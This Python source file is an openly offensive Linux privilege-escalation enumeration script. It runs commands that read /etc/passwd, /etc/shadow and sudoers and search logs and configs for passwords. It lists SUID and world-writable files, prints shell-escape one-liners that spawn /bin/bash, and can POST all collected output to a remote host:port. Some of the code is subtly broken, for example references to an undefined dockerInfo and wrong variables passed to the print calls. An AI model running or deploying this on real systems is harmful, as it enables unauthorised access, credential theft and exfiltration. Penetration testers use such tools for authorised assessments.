from __future__ import print_function, unicode_literals
from collections import OrderedDict
from io import open     # Avoid unicode nightmares
import argparse
import sys
import subprocess as sub
try:
    # Python 2 imports
    from urllib2 import Request, urlopen
    from urllib import urlencode
except ImportError:
    # Python 3 imports
    from urllib.request import Request, urlopen
    from urllib.parse import urlencode

__version__ = '1.0.0'


class HTTPUpload(object):
    """Send our collected data back."""
    def __init__(self, host, port):
        self.url = 'http://{}:{}'.format(host, port)

    def write(self, msg):
        post = {'data': msg}
        try:
            r = Request(self.url, urlencode(post).encode("utf-8"))
            urlopen(r)
        except UnicodeEncodeError:
            # This exception gets raised when UTF-16 is part of the input
            pass


bigline = "==================================================================================================="
smlline = "---------------------------------------------------------------------------------------------------"

BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)

def printColour(text, streams, colour=None):
    try:
        if colour != -1 and colour is not None:
            text = "\x1b[1;{}m{}\x1b[0m".format(30 + colour, text)
        for s in streams:
            s.write(text)
    except UnicodeEncodeError:
        # This exception gets raised when UTF-16 is part of the input
        pass

# loop through dictionary, execute the commands, store the results, return updated dict
def execCmd(cmdDict):
    for item in cmdDict:
        cmd = cmdDict[item]["cmd"]
        out, error = sub.Popen([cmd], stdout=sub.PIPE, stderr=sub.PIPE, shell=True).communicate()
        results = out.decode('utf-8').splitlines()
        cmdDict[item]["results"] = results
    return cmdDict

# print results for each previously executed command, no return value
def printFormatResult(cmdDict, streams, color=None):
    c = YELLOW if color is True else None
    for item in cmdDict:
        msg = cmdDict[item]["msg"]
        results = cmdDict[item]["results"]
        printColour("\n\n[+] " + msg, streams, c)
        for result in results:
            if result.strip() != "":
                printColour("\n    {:}".format(result), streams)
        printColour("", streams, color)
    return

def getSystemInfo():
    sysInfo = OrderedDict()
    sysInfo["OS"] = {"cmd": "cat /etc/issue",
                     "msg": "Operating System"} 
    sysInfo["KERNEL"] = {"cmd": "cat /proc/version",
                         "msg": "Kernel"}
    sysInfo["HOSTNAME"] = {"cmd": "hostname",
                           "msg": "Hostname"}

    return execCmd(sysInfo)
    
def getNetworkInfo():
    netInfo = OrderedDict()
    netInfo["NETINFO"] = {"cmd": "if command -v ip 1>/dev/null; then ip addr show; else ifconfig; fi",
                          "msg": "Interfaces"}
    netInfo["ROUTE"] = {"cmd": "route",
                        "msg": "Route"}
    netInfo["NETSTAT"] = {"cmd": "netstat -antup | grep -v 'TIME_WAIT'",
                          "msg": "Netstat"}
    netInfo["ARP"] = {"cmd": "arp -a",
                      "msg": "Arp cache"}

    return execCmd(netInfo)
    
def getFileSystemInfo():
    driveInfo = OrderedDict()
    driveInfo["MOUNT"] = {"cmd": "mount",
                          "msg": "Mount results"}
    driveInfo["FSTAB"] = {"cmd": "cat /etc/fstab 2>/dev/null",
                          "msg": "fstab entries"}

    return execCmd(driveInfo)
    
def getCronJobs():
    cronInfo = OrderedDict()
    cronInfo["CRON"] = {"cmd": "ls -la /etc/cron* 2>/dev/null",
                        "msg":"Scheduled cron jobs"}
    cronInfo["CRONW"] =  {"cmd": "ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null",
                          "msg":"Writable cron dirs"}

    return execCmd(cronInfo)

def getSystemdInfo():
    systemdInfo = OrderedDict()
    systemdInfo["systemctl timers"] = {"cmd": "systemctl list-timers",
                                       "msg": "systemd scheduled tasks"}
    systemdInfo["journalctl"] = {"cmd": "journalctl -n 50",
                                 "msg": "Last lines in journalctl (privileged to adm)"}

    return execCmd(systemdInfo)
    
def getUserInfo():
    userInfo = OrderedDict()
    userInfo["WHOAMI"] = {"cmd": "whoami",
                           "msg":"Current User"}
    userInfo["ID"] = {"cmd": "id",
                      "msg": "Current User ID"}
    userInfo["ALLUSERS"] = {"cmd": "cat /etc/passwd",
                            "msg": "All users"}
    userInfo["ALLGROUPS"] = {"cmd": "cat /etc/group",
                             "msg": "All groups"}
    userInfo["SUPUSERS"] = {"cmd": "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'",
                            "msg":"Super Users Found:"}
    userInfo["HISTORY"] = {"cmd": "ls -la ~/.*hist*; ls -la /root/.*hist* 2>/dev/null",
                           "msg": "Root and current user history (depends on privs)"}
    userInfo["ENV"] = {"cmd": "env 2>/dev/null | grep -v 'LS_COLORS'",
                       "msg": "Environment"}
    userInfo["SUDOERS"] = {"cmd": "cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null",
                           "msg": "Sudoers (privileged)"}
    userInfo["SUDOCMD"] = {"cmd": "sudo -n -l 2>/dev/null",
                           "msg": "Allowed sudo commands"}
    userInfo["LOGGEDIN"] = {"cmd": "w 2>/dev/null",
                            "msg": "Logged in User Activity"}

    return execCmd(userInfo)

def interestingGroups(groups):
    groupInfo = OrderedDict()
    if 'sudo' in groups:
        groupInfo['sudo'] = {"msg": "User belongs to the group: sudo",
                             "results": ["Can be used for privilege escalation."]}
    if 'adm' in groups:
        groupInfo['adm'] = {"msg": "User belongs to group: adm",
                            "results": ["Can view numerous log files/journalctl and perhaps perform some administrative tasks. Might I suggest to run:\nfind / -group adm -ls 2>/dev/null"]}
    if 'docker' in groups:
        groupInfo["docker"] = {"msg": "User belongs to group: docker",
                               "results": ["Might be used for privilege escalation. Consider e.g. https://fosterelli.co/privilege-escalation-via-docker.html"]}
    if 'lxd' in groups:
        groupInfo["lxd"] = {"msg": "User belongs to group: lxd",
                            "results": ["Consider e.g. https://reboare.github.io/lxd/lxd-escape.html"]}

    return groupInfo

def getFileDirInfo():
    fdPerms = OrderedDict()
    fdPerms["WWDIRSROOT"] = {"cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -ls 2>/dev/null | grep root",
                             "msg":"World Writeable Directories for User/Group 'Root'"}
    fdPerms["WWDIRS"] = {"cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -ls 2>/dev/null | grep -v root", 
                         "msg":"World Writeable Directories for Users other than Root"}
    fdPerms["WWFILES"] = {"cmd": "find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -ls 2>/dev/null",
                          "msg" :"World Writable Files"}
    fdPerms["SUID"] = {"cmd": "find / \( -perm -2000 -o -perm -4000 \) -ls 2>/dev/null",
                       "msg":"SUID/SGID Files and Directories"}
    fdPerms["USERHOME"] = {"cmd": "ls -ahl /home",
                           "msg": "Checking permissions on the home folders."}
    fdPerms["ROOTHOME"] = {"cmd": "ls -ahl /root 2>/dev/null",
                           "msg": "Checking if root's home folder is accessible"}

    return execCmd(fdPerms)   


def getPwFileInfo():
    pwFiles = OrderedDict()
    pwFiles["LOGPWDS"] = {"cmd": "find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
                           "msg": "Logs containing keyword 'password'"}
    pwFiles["CONFPWDS"] = {"cmd": "find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
                            "msg": "Config files containing keyword 'password'"}
    pwFiles["SHADOW"] = {"cmd": "cat /etc/shadow 2>/dev/null",
                          "msg": "Shadow File (Privileged)"}

    return execCmd(pwFiles)

def getMail():
    mailFiles = OrderedDict({"MAIL": {"cmd": "ls -la /var/mail 2>/dev/null",
                             "msg": "Any mail that can be read."}})

    return execCmd(mailFiles)
    

def processesAppsInfo(sysInfo):
    if "debian" in sysInfo["KERNEL"]["results"][0].lower() or "ubuntu" in sysInfo["KERNEL"]["results"][0].lower():
        getPkgs = "dpkg -l | awk '{$1=$4=\"\"; print $0}'" # debian
    elif "arch" in sysInfo["KERNEL"]["results"][0].lower():
        getPkgs = "pacman -Qe"
    else:
        getPkgs = "rpm -qa | sort -u" # RH/other
    
    getAppProc = OrderedDict()
    getAppProc["PROCS"] = {"cmd": "ps aux | awk '{print $1,$2,$9,$10,$11}'",
                           "msg": "Current processes"}
    getAppProc["PKGS"] = {"cmd": getPkgs,
                          "msg": "Installed Packages"}
    getAppProc["CONF"] = {"cmd": "find /etc -name '*.conf' -ls 2>/dev/null",
                          "msg": "configuration files inside /etc"}

    return execCmd(getAppProc)
    
def moreApps():
    otherApps = OrderedDict()
    otherApps["SUDO"] = {"cmd": "sudo -V | grep version 2>/dev/null",
                          "msg":"Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)"}
    otherApps["APACHE"] = {"cmd": "apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null",
                           "msg":"Apache Version and Modules"}
    otherApps["APACHECONF"] = {"cmd": "cat /etc/apache2/apache2.conf 2>/dev/null",
                               "msg":"Apache Config File"}

    return execCmd(otherApps)
    
def rootProcesses(procs, pkgs, supusers):
    procdict = OrderedDict() # dictionary to hold the processes running as super users
    # find the package information for the processes currently running
    # under root or another super user
    for proc in procs: # loop through each process
        relatedpkgs = [] # list to hold the packages related to a process    
        try:
            for user in supusers: # loop through the known super users
                if (user != "") and (user in proc): # if the process is being run by a super user
                    procname = proc.split(" ")[4] # grab the process name
                    if "/" in procname:
                            splitname = procname.split("/")
                            procname = splitname[len(splitname)-1]
                    for pkg in pkgs: # loop through the packages
                        if not len(procname) < 3: # name too short to get reliable package results
                            if procname in pkg: 
                                if procname in procdict: 
                                    relatedpkgs = procdict[proc] # if already in the dict, grab its pkg list
                                if pkg not in relatedpkgs:
                                    relatedpkgs.append(pkg) # add pkg to the list
                    procdict[proc]=relatedpkgs # add any found related packages to the process dictionary entry
        except:
            pass

    result = ''
    for key in procdict:
        result += "\n    " + key # print the process name
        try:
            if not procdict[key][0] == "": # only print the rest if related packages were found
                result += "        Possible Related Packages: "
                for entry in procdict[key]:
                    result += "            " + entry.decode('UTF-8') # print each related package
        except:
            pass

    return result

def getContainerInfo():
    containerInfo = OrderedDict()
    containerInfo["DockerVersion"] = {"cmd": "docker --version 2>/dev/null",
                                      "msg": "Is docker available"}
    containerInfo["DockerInside"] = {"cmd": "cat /proc/self/cgroup | grep 'docker' && ls -l /.dockerenv 2>/dev/null",
                                     "msg": "Are we inside a docker container?"}
    containerInfo["LXCInside"] = {"cmd": "grep -qa container=lxc /proc/1/environ 2>/dev/null",
                                  "msg": "Are we inside a lxc container (privileged)?"}

    return execCmd(containerInfo)
    
# EXPLOIT ENUMERATION
def exploitEnum():
    devTools = OrderedDict()
    devTools["TOOLS"] = {"cmd": "which awk perl python python2 python3 ruby gcc go rustc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null | grep -v 'not found'",
                         "msg": "Installed Tools"}

    return execCmd(devTools)
    
def main(args):
    if args.outputfile:
        try:
            outfile = open(args.outputfile, 'w', encoding='UTF-8')
        except IOError:
            msg = 'Something went wrong when opening the file that will contain the results. Giving up!'
            if parser.color and not args.quiet:
                printColour(msg, sys.stdout, RED)
            elif not args.quiet:
                print(msg)
            sys.exit(1)
    else:
        args.outputfile = False
    
    if args.sendhttp:
        ip, port = args.sendhttp.split(':')
        upload = HTTPUpload(ip, port)

    outputs = []
    if not args.quiet: outputs.append(sys.stdout)
    if args.outputfile: outputs.append(outfile)
    if args.sendhttp: outputs.append(upload)
    
    printColour(bigline, outputs, GREEN)
    printColour("\n     The Linux privilege escalation checker\n", outputs, GREEN)
    printColour(bigline, outputs, GREEN)
    printColour('\n', outputs, True)

    sysInfo = getSystemInfo()
    printColour("\n\n\n[*] GETTING BASIC SYSTEM INFO...\n", outputs, RED)
    printFormatResult(sysInfo, outputs, True)

    userInfo = getUserInfo()
    groupInfo = interestingGroups(userInfo["ID"]["results"][0])
    printColour("\n\n\n[*] ENUMERATING USER AND ENVIRONMENTAL INFO...\n", outputs, RED)
    printFormatResult(userInfo, outputs, True)
    printFormatResult(groupInfo, outputs, True)

    netInfo = getNetworkInfo()
    printColour("\n\n\n[*] GETTING NETWORKING INFO...\n", outputs, RED)
    printFormatResult(netInfo, outputs, True)
    
    fsInfo = getFileSystemInfo()
    printColour("\n\n\n[*] GETTING FILESYSTEM INFO...\n", outputs, RED)
    printFormatResult(fsInfo, outputs, True)

    cronInfo = getCronJobs()
    printColour("\n\n\n[*] GETTING INFO ON CRON JOBS...\n", outputs, RED)
    printFormatResult(cronInfo, outputs, True)

    systemdInfo = getSystemdInfo()
    printColour("\n\n\n[*] GETTING systemd/journalctl INFO...\n", outputs, RED)
    printFormatResult(systemdInfo, outputs, True)

    fileDirInfo = getFileDirInfo()
    printColour("\n\n\n[*] GETTING FILESYSTEM INFO...\n", outputs, RED)
    printFormatResult(fileDirInfo, outputs, True)

    pwFileInfo = getPwFileInfo()
    printColour("\n\n\n[*] GETTING FILESYSTEM INFO...\n", outputs, RED)
    printFormatResult(pwFileInfo, outputs, True)

    mailInfo = getMail()
    printColour("\n\n\n[*] GETTING MAIL INFO...\n", outputs, RED)
    printFormatResult(mailInfo, outputs, True)

    psInfo = processesAppsInfo(sysInfo)
    printColour("\n\n\n[*] GETTING INFO ON PROCESSES AND APPS...\n", outputs, RED)
    printFormatResult(psInfo, outputs, True)

    apps = moreApps()
    printColour("\n\n\n[*] GETTING MORE INFO ON APPS...\n", outputs, RED)
    printFormatResult(mailInfo, outputs, True)

    #  rootPsInfo = rootProcesses(psInfo["PROCS"]["results"], psInfo["PKGS"]["results"], userInfo["SUPUSERS"]["results"])
    #  printColour("\n\n\n[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...\n", outputs, RED)
    #  printColour(rootPsInfo, outputs)

    containerInfo = getContainerInfo()
    printColour("\n\n\n[*] GETTING LXC/DOCKER INFO...\n", outputs, RED)
    printFormatResult(dockerInfo, outputs, True)

    exploitTools = exploitEnum()
    printColour("\n\n\n[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...\n", outputs, RED)
    printFormatResult(exploitTools, outputs, True)

    printColour("\n\n\n[+] Related Shell Escape Sequences...\n", outputs, YELLOW)
    escapeCmd = {"vi": [":!bash", ":set shell=/bin/bash:shell"],
                 "awk": ["awk 'BEGIN {system(\"/bin/bash\")}'"],
                 "perl": ["perl -e 'exec \"/bin/bash\";'"],
                 "find": ["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"],
                 "nmap":["--interactive"]}
    for cmd in escapeCmd:
        for result in exploitTools["TOOLS"]["results"]:
            if cmd in result:
                for item in escapeCmd[cmd]:
                    printColour("\n    " + cmd + "-->\t" + item, outputs)

    if args.outputfile:
        outfile.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--color', dest='color', default=False, required=False, action='store_true', help='Make the output colorized (default is off)')
    parser.add_argument('-o', '--outputfile', dest='outputfile', required=False, help='Save the output to a file')
    parser.add_argument('-s', '--sendhttp', dest='sendhttp', default=False, required=False, help='Sends the output to host:port')
    parser.add_argument('-q', '--quiet', dest='quiet', default=False, required=False, action='store_true', help="Don't output results to the terminal")
    parser.add_argument('-f', '--fullreport', dest='fullreport', default=False, required=False, action='store_true', help='Get contents of interesting files, like cron jobs')
    args = parser.parse_args()

    main(args)
